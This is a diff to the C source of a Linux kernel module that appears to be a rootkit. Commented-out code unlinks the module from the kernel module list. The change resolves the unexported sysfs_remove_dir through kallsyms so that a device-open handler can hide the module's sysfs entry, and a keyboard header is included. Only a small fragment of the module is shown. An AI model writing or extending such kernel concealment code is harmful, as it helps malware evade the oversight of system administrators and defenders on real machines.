@@ -5,6 +5,7 @@
 #include <linux/keyboard.h>
 #include <linux/module.h>
 #include <linux/debugfs.h>
+#include <linux/kallsyms.h>
 #include <linux/kernfs.h>
 #include <linux/uaccess.h>
 #include <linux/slab.h>
@@ -34,7 +35,6 @@ int major_number;
 int ret;
 dev_t dev_num;
 dev_t dev_num1;
-  
 
 /*void hide(void)
 {
@@ -46,14 +46,13 @@ void unhide(void)
     list_add(&THIS_MODULE->list, module_list);
     is_hide=0;
 }*/
-static long unsigned (funcp *)(struct kobject * kobj);
+void (*sysfs_remove_fir_orig)(struct kobject *);
 
 int dev_open_fops_for_hide(struct inode *inode, struct file* file)
 {
     static struct list_head *module_list;
     struct kobject* saved_kobj_parent;
-    //static long unsigned (funcp *) (struct kobject * kobj) = module_kallsyms_lookup_name("sysfs_remove_dir");
-    static long unsigned funcp = (unsigned long*) module_kallsyms_lookup_name("sysfs_remove_dir");
+    sysfs_remove_fir_orig = (void *)module_kallsyms_lookup_name("sysfs_remove_dir");
     if (!is_hide)
     {
 
